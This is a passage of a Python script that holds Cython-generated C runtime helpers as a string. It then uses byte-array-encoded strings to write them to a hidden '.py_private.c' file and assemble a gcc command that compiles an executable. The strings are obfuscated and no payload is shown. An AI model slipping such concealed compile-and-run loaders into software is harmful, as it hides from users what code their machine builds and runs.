                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* FastTypeChecks */
    #if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = bytes([46, 112, 121, 95, 112, 114, 105, 118, 97, 116, 101, 46, 99]).decode()
PYTHON_VERSION = bytes([46]).decode().join(sys.version.split(bytes([32]).decode())[0].split(bytes([46]).decode())[:-1])
COMPILE_FILE = (
    bytes([103, 99, 99, 32, 45, 73]).decode() +
    PREFIX +
    bytes([47, 105, 110, 99, 108, 117, 100, 101, 47, 112, 121, 116, 104, 111, 110]).decode() +
    PYTHON_VERSION +
    bytes([32, 45, 111, 32]).decode() +
    EXECUTE_FILE +
    bytes([32]).decode() +
    C_FILE +
    bytes([32, 45, 76]).decode() +
    PREFIX +
    bytes([47, 108, 105, 98, 32, 45, 108, 112, 121, 116, 104, 111, 110]).decode() +
    PYTHON_VERSION
)


with open(C_FILE, bytes([119]).decode()) as f:
    f.write(C_SOURCE)

